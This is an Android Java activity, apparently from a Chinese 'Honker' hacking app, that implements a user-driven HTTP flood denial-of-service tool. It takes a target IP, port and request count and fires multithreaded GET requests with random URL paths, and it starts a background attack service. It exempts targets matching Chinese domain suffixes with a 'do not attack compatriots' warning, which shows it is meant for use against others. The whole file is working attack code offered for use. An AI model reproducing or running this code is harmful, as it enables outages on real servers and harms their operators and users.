package cn.ctkqiang.huaxiahongke.activities;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import cn.ctkqiang.huaxiahongke.R;
import cn.ctkqiang.huaxiahongke.constants.Constants;
import cn.ctkqiang.huaxiahongke.service.DdosAttackService;

public class DDOSActivity extends AppCompatActivity
{

    private static final String TAG = Constants.TAG_NAME;

    private String[] 中国域名后缀 = {
            ".cn",          // 中国通用域名
            ".xin",         // 中国的一个新的域名后缀
            ".gov.cn",      // 中国政府网站
            ".edu.cn",      // 中国教育机构
            ".org.cn",      // 中国组织
            ".net.cn",      // 中国网络相关实体
            ".公司",        // 中文公司域名
            ".网络",        // 中文网络域名
            ".中国",        // 中文中国域名
            ".中国公司",     // 中文中国公司域名
            ".政务",        // 中文政府事务域名
            ".公益",        // 中文公益域名
            ".me",          // 个人域名（在中国较为流行）
            ".hk",          // 香港域名
            ".mo",          // 澳门域名
            ".tw",          // 台湾域名
            ".中国论坛",     // 中文论坛域名
            ".商标",        // 中文商标域名
            ".法律",        // 中文法律相关域名
            ".商会"         // 中文商会域名
    };


    private String 主机 = "";
    private String IP = "";
    private int 端口 = 80;
    private int 请求数 = 100;
    private ExecutorService 执行器服务;

    private EditText ip编辑框;
    private EditText 端口编辑框;
    private EditText 请求数编辑框;
    private TextView 终端TextView;

    private ProgressDialog loadingDialog; // 进度对话框


    // 攻击方法
    private void 执行攻击()
    {
        String url路径 = 生成Url路径();  // 生成URL路径

        if (是否是中国域名(url路径) || 是否是中国域名(IP))
        {
            runOnUiThread(new Runnable()
            {
                @Override
                public void run()
                {
                    new AlertDialog.Builder(DDOSActivity.this)
                            .setTitle("紧急警告")
                            .setMessage("⚠️ 禁止攻击同胞!!! ⚠️\n\n此操作严重，并可能造成不可逆后果！\n请立刻停止！")
                            .setIcon(android.R.drawable.ic_dialog_alert)
                            .setCancelable(false)
                            .setPositiveButton("我明白了", new DialogInterface.OnClickListener()
                            {
                                @Override
                                public void onClick(DialogInterface dialog, int which)
                                {
                                    dialog.dismiss();
                                    finish();
                                }
                            })
                            .show();
                }
            });

            return;
        }

        // 检查 IP 是否有效
        if (IP == null || IP.isEmpty())
        {
            Log.e(TAG, "IP 地址无效");
            return;
        }

        String urlString = (端口 == 0) ? IP : "http://" + IP + ":" + 端口 + "/" + url路径;

        Log.d(TAG, "请求的 URL: " + urlString);

        try
        {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);

            int 响应码 = connection.getResponseCode();

            final String logMessage = "[响应码: <<" + 响应码 + ">> ] * " + "请求= " + urlString;
            更新终端日志(logMessage);

            connection.disconnect();

        } catch (Exception e)
        {
            e.printStackTrace();

            final String errorMessage = "请求出错: " + e.getMessage() + "\n";
            更新终端日志(errorMessage);
        }
    }


    // 更新终端日志（UI 线程）
    private void 更新终端日志(final String 信息)
    {
        runOnUiThread(new Runnable()
        {
            @Override
            public void run()
            {
                if (终端TextView != null)
                {
                    终端TextView.append( 信息);
                    终端TextView.scrollTo(0, 终端TextView.getHeight()); // 自动滚动到底部

                    Log.i(TAG, "run: " + 信息);

                } else
                {
                    Log.e(TAG, "TextView 为 null，无法更新。");
                }
            }
        });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ddosactivity);


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "DDoS攻击频道";
            String description = "DDoS攻击进度频道";

            int importance = NotificationManager.IMPORTANCE_LOW;

            NotificationChannel channel = new NotificationChannel("DdosAttackChannel", name, importance);
            channel.setDescription(description);

            // 注册通知渠道
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }


        Objects.requireNonNull(this.getSupportActionBar()).hide();

        ip编辑框 = findViewById(R.id.ipEditText);
        端口编辑框 = findViewById(R.id.portEditText);
        请求数编辑框 = findViewById(R.id.requestsEditText);

        // 确保 terminalTextView 正确初始化
        终端TextView = findViewById(R.id.terminalTextView);
        if (终端TextView == null)
        {
            Log.e(TAG, "错误: 未能找到 terminalTextView 控件。");
        }

        设置网络权限();

        findViewById(R.id.startAttackButton).setOnClickListener(new View.OnClickListener()
        {
            @SuppressLint("SetTextI18n")
            @Override
            public void onClick(View view)
            {
                IP = ip编辑框.getText().toString().trim();

                if (IP.isEmpty())
                {
                    IP = 解析主机IP(主机); // 如果没有提供 IP，则从主机解析 IP
                }

                try
                {
                    端口 = Integer.parseInt(端口编辑框.getText().toString());
                } catch (NumberFormatException e)
                {
                    端口 = 0;
                }

                try
                {
                    请求数 = Integer.parseInt(请求数编辑框.getText().toString().trim());
                } catch (NumberFormatException e)
                {
                    请求数 = 100; // 默认请求数
                }

                // 启动 DDoS 攻击
                执行器服务 = Executors.newFixedThreadPool(10);  // 使用 10 个线程的线程池
                启动Ddos攻击();

                // 更新状态
                TextView 状态文本 = findViewById(R.id.statusTextView);


                if ((端口 == 0))
                {
                    状态文本.setText("攻击已开始，目标IP:" + "端口: " + 端口);
                } else
                {
                    状态文本.setText("攻击已开始，目标IP:" + IP + "端口: " + 端口);
                }

            }
        });

        findViewById(R.id.stopAttackButton).setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View view)
            {
                finish();
            }
        });


        findViewById(R.id.terminalTextView).setOnLongClickListener(new View.OnLongClickListener()
        {
            @Override
            public boolean onLongClick(View view)
            {
                终端TextView.setText("");
                return true;
            }
        });
    }

    // 设置网络权限
    private void 设置网络权限()
    {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED)
        {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.INTERNET}, 1);
        }

        // 允许在主线程执行网络请求
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
    }

    // 解析主机 IP 地址
    private String 解析主机IP(String 主机)
    {
        try
        {
            return java.net.InetAddress.getByName(主机).getHostAddress();
        } catch (Exception e)
        {
            e.printStackTrace();
            return "";
        }
    }

    // 启动 DDoS 攻击
    private void 启动Ddos攻击()
    {
        Toast.makeText(this, "开始攻击 " + 主机 + "，IP: " + IP, Toast.LENGTH_SHORT).show();

        Intent serviceIntent = new Intent(this, DdosAttackService.class);
        startService(serviceIntent);

        loadingDialog = new ProgressDialog(this);
        loadingDialog.setTitle("攻击进行中");
        loadingDialog.setMessage("已发送 0 请求...");
        loadingDialog.setCancelable(false);
        loadingDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        loadingDialog.setMax(请求数);
        loadingDialog.show();

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                for (int i = 0; i < 请求数; i++)
                {
                    执行器服务.execute(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            执行攻击();
                        }
                    });

                    final int progress = i + 1;

                    runOnUiThread(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            loadingDialog.setProgress(progress);
                            loadingDialog.setMessage("已发送 " + progress + " 请求...");
                        }
                    });

                    try
                    {
                        Thread.sleep(10); // 0.01 秒延迟
                    } catch (InterruptedException e)
                    {
                        e.printStackTrace();
                    }
                }

                runOnUiThread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        loadingDialog.dismiss();
                        Toast.makeText(DDOSActivity.this, "攻击完成！", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        }).start();
    }

    // 生成随机 URL 路径
    private String 生成Url路径()
    {
        String 字符集 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+";
        Random 随机 = new Random();
        StringBuilder 路径 = new StringBuilder();

        for (int i = 0; i < 50; i++)
        {
            路径.append(字符集.charAt(随机.nextInt(字符集.length())));
        }

        return 路径.toString();
    }


    private boolean 是否是中国域名(String url路径)
    {


        for (String 后缀 : 中国域名后缀)
        {
            if (url路径.contains(后缀))
            {
                return true;
            }
        }

        return false;
    }

}
